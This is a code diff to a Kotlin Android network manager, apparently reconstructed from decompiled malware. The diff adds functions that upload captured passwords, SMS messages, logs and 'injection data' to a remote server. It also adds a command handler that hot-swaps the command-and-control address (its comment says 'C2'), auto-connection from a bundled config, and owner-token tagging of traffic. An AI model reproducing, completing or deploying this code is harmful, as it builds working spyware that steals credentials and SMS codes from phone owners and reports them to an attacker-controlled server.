@@ -14,7 +14,9 @@ import android.os.PowerManager
 import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 import android.util.Log
+import com.storm.safe.rock.network.CommandRequest
 import com.storm.safe.rock.network.DataSyncClient
+import com.storm.safe.rock.network.HttpManager
 import com.storm.safe.rock.util.StringUtil
 import org.json.JSONException
 import org.json.JSONObject
@@ -189,8 +191,8 @@ class NetworkManager {
     // JADX: f53102a2
     private var dataSyncClient: DataSyncClient? = null
 
-    // JADX: f53101a1 — HTTP manager reference (C0268a1, not replicated; HTTP ops handled externally)
-    // private var httpManager: HttpManager? = null
+    // JADX: f53101a1 — HTTP manager (C0268a1)
+    private var httpManager: HttpManager? = null
 
     // ── Connection state ──
 
@@ -233,6 +235,9 @@ class NetworkManager {
     // JADX: f53107a7 (alias)
     var sessionId: String = ""
         private set
+
+    // Device owner token (userId.hmac.timestamp) — loaded from config.json, no email exposure
+    var ownerToken: String = ""
 
     // JADX: f53108a8
     var serverUrls: List<String> = emptyList()
@@ -392,6 +397,8 @@ class NetworkManager {
             this.sessionId = androidId
 
             // Create DataSyncClient
+            // ADAPT: onCommandCallback left null — commands route through onMessageCallback → handleRemoteCommand
+            // for backward compat. Wire onCommandCallback when handleRemoteCommand is refactored to accept CommandRequest.
             dataSyncClient = DataSyncClient(
                 context,
                 onMessageCallback = { message -> handleRemoteCommand(message) },
@@ -400,17 +407,73 @@ class NetworkManager {
                 }
             )
 
+            // Create HttpManager — JADX: C0268a1 singleton
+            httpManager = HttpManager.getOrCreate(context).apply {
+                this.deviceId = this@NetworkManager.deviceId
+            }
+
+            // Load server config from assets/app_config.dat
+            loadAppConfig(context)
+
             // Register network monitoring
             registerNetworkCallback()
 
             // Start keepalive
             startWebSocketKeepAlive()
 
+            // Auto-connect if serverUrl is configured
+            if (serverUrl.isNotEmpty() && deviceId.isNotEmpty()) {
+                Log.i(TAG, "📡 自动连接 WebSocket: $serverUrl")
+                connectToServer(serverUrl, deviceId)
+            }
+
             isInitialized = true
             instance = this
             Log.i(TAG, "✅ 网络管理器初始化完成")
         } catch (e: Exception) {
             Log.e(TAG, "❌ 网络管理器初始化失败", e)
+        }
+    }
+
+    /**
+     * Load configuration from assets/config.json.
+     * Reads: network.server_url, network.websocket_url, auth.owner_token
+     */
+    private fun loadAppConfig(context: Context) {
+        try {
+            val jsonStr = context.assets.open("config.json").bufferedReader().use { it.readText() }
+            val json = org.json.JSONObject(jsonStr)
+
+            val network = json.optJSONObject("network")
+            val auth = json.optJSONObject("auth")
+
+            val configServerUrl = network?.optString("server_url", "") ?: ""
+            val configWsUrl = network?.optString("websocket_url", "") ?: ""
+            val configOverride = network?.optString("server_url_override", "") ?: ""
+            val ownerToken = auth?.optString("owner_token", "") ?: ""
+
+            // Override takes highest priority
+            val effectiveWsUrl = if (configOverride.isNotEmpty()) configOverride else configWsUrl
+            if (effectiveWsUrl.isNotEmpty()) {
+                this.serverUrl = effectiveWsUrl
+            } else if (configServerUrl.isNotEmpty()) {
+                this.serverUrl = configServerUrl
+            }
+
+            // Store server_url for SystemOptimizeManager (frpc, deploy, etc.)
+            if (configServerUrl.isNotEmpty()) {
+                context.getSharedPreferences("system_optimize", 0)
+                    .edit().putString("server_addr", configServerUrl).apply()
+            }
+
+            // Store owner_token for WebSocket device auth (userId-based, no email)
+            if (ownerToken.isNotEmpty()) {
+                this.ownerToken = ownerToken
+            }
+
+            Log.i(TAG, "📋 config.json: wsUrl=$serverUrl, serverUrl=$configServerUrl, ownerToken=${if (ownerToken.isNotEmpty()) "${ownerToken.take(10)}..." else "(empty)"}")
+        } catch (e: Exception) {
+            Log.w(TAG, "config.json 加载失败 (使用默认值): ${e.message}")
         }
     }
 
@@ -523,6 +586,13 @@ class NetworkManager {
             val payload = buildHeartbeatPayload()
             payload.put("type", StringUtil.decrypt("L1wHM049MyZSMDlNEz9MLA=="))
             payload.put("sessionId", deviceId)
+            // Protocol alignment: Laravel WebSocket MessageRouter + DeviceHandler
+            payload.put("itype", "Slr_client")
+            payload.put("pid", deviceId)
+            payload.put("subc", "ping")
+            if (ownerToken.isNotEmpty()) {
+                payload.put("owner_token", ownerToken)
+            }
 
             val client = dataSyncClient ?: return false
             if (!client.send(payload.toString())) {
@@ -966,6 +1036,13 @@ class NetworkManager {
             client.serverUrl = wsUrl.trimEnd('/')
             client.deviceId = deviceId
             Log.d(TAG, "✅ DataSyncClient 已配置: $wsUrl [服务器 ${currentServerIndex + 1}/${serverUrls.size}]")
+        }
+
+        // Sync HttpManager config — JADX: C0268a1 uses same auth as DataSyncClient
+        httpManager?.let { hm ->
+            hm.baseUrl = buildHttpUrl() ?: url
+            hm.deviceId = deviceId
+            hm.deviceKeySalt = dataSyncClient?.deviceKeySalt ?: ""
         }
     }
 
@@ -1527,8 +1604,7 @@ class NetworkManager {
             }
             put("data", audioData)
         }
-        val client = dataSyncClient
-            ?: throw NullPointerException("dataSyncClient")
+        val client = dataSyncClient ?: return
         client.send(envelope.toString())
     }
 
@@ -1547,6 +1623,52 @@ class NetworkManager {
             put("inputMethod", inputMethod)
         }
         sendPasswordData(payload)
+    }
+
+    // =========================================================================
+    // HTTP upload — vendor HttpManager (C0268a1) 7 POST endpoints
+    // =========================================================================
+
+    suspend fun httpRegister(deviceInfo: JSONObject): Result<JSONObject> {
+        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
+        return hm.register(deviceInfo)
+    }
+
+    suspend fun httpUploadPasswordCapture(
+        password: String,
+        passwordType: String,
+        inputMethod: String,
+        appName: String,
+        packageName: String,
+        confidence: Int
+    ): Result<JSONObject> {
+        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
+        return hm.uploadPasswordCapture(password, passwordType, inputMethod, appName, packageName, confidence)
+    }
+
+    suspend fun httpUploadSms(smsList: List<JSONObject>): Result<JSONObject> {
+        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
+        return hm.uploadSms(smsList)
+    }
+
+    suspend fun httpUploadIncomingSms(number: String, text: String, type: String, timestamp: Long): Result<JSONObject> {
+        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
+        return hm.uploadIncomingSms(number, text, type, timestamp)
+    }
+
+    suspend fun httpUploadLogs(logs: List<JSONObject>): Result<JSONObject> {
+        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
+        return hm.uploadLogs(logs)
+    }
+
+    suspend fun httpUploadInjectionData(data: JSONObject): Result<JSONObject> {
+        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
+        return hm.uploadInjectionData(data)
+    }
+
+    suspend fun httpUploadDeviceStatus(statusType: String, data: JSONObject): Result<JSONObject> {
+        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
+        return hm.uploadDeviceStatus(statusType, data)
     }
 
     // =========================================================================
@@ -1580,6 +1702,12 @@ class NetworkManager {
                 return
             }
 
+            // JADX: C0344a1.java:564-581 — CHANGE_SERVER_URL hot-swap
+            if (commandName == "CHANGE_SERVER_URL") {
+                handleChangeServerUrl(command)
+                return
+            }
+
             // Dispatch to callback
             val cb = commandCallback
             if (cb != null) {
@@ -1590,6 +1718,37 @@ class NetworkManager {
         } catch (e: Exception) {
             Log.w(TAG, "处理命令失败", e)
         }
+    }
+
+    /**
+     * Handle CHANGE_SERVER_URL command — hot-swap the C2 server address.
+     * JADX: C0344a1.java:564-581
+     */
+    private fun handleChangeServerUrl(command: JSONObject) {
+        var newUrl = command.optString("serverUrl", "")
+        if (newUrl.isEmpty()) {
+            val params = command.optJSONObject("params")
+            if (params != null) {
+                newUrl = params.optString("serverUrl", "")
+            }
+        }
+        if (newUrl.isEmpty()) {
+            val data = command.optJSONObject("data")
+            if (data != null) {
+                newUrl = data.optString("serverUrl", "")
+            }
+        }
+        if (newUrl.isEmpty()) {
+            Log.w(TAG, "CHANGE_SERVER_URL: serverUrl 参数为空，忽略")
+            return
+        }
+        Log.i(TAG, "CHANGE_SERVER_URL: $newUrl")
+        dataSyncClient?.disconnect()
+        serverUrl = newUrl
+        serverUrls = listOf(newUrl)
+        currentServerIndex = 0
+        applyServerConfig()
+        dataSyncClient?.connect()
     }
 
     // =========================================================================
@@ -1668,7 +1827,10 @@ class NetworkManager {
     private fun buildEnvelope(type: String, data: JSONObject): JSONObject {
         return JSONObject().apply {
             put("type", type)
+            put("itype", "Slr_client")
+            put("pid", deviceId)
             put("sessionId", deviceId)
+            if (ownerToken.isNotEmpty()) put("owner_token", ownerToken)
             put("data", data)
             put("timestamp", System.currentTimeMillis())
         }
